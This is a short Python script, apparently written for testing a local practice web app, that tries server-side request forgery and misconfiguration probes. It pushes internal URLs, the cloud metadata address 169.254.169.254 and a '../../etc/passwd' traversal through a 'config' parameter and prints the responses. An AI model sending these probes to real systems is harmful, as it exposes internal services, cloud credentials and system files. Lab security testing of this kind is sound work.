import requests

# Configuration
base_url = "http://127.0.0.1:42001/"

#done below to fetch resonse and print it in text
vuln_url = base_url + "misconfigured-endpoint"
test_urls = [
    "http://127.0.0.1:80/admin",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:80/secret",
    "http://169.254.169.254/latest/meta-data/",
    base_url + "default-password",
    base_url + "outdated-software",
    base_url + "unprotected-files",
    base_url + "unused-features",
    base_url + "security-misconfig",
    base_url + "directory-traversal?path=../../etc/passwd"
]

# Headers
headers = {
    'Cookie': 'PHPSESSID=rkg47evun26n2jg6vjhrg3vlk8; security=low',
}

#write all the mainfunctions here 
def test_misconfiguration(target_url):
    params = {
        'config': target_url  # The parameter name might be different depending on the application
    }
    response = requests.get(vuln_url, params=params, headers=headers)
    print(f"Response from {target_url}:")
    print(response.text)

def main():
    print("Testing various misconfiguration vulnerabilities")
    for url in test_urls:
        print(f"Testing URL: {url}")
        test_misconfiguration(url)

if __name__ == "__main__":
    main()
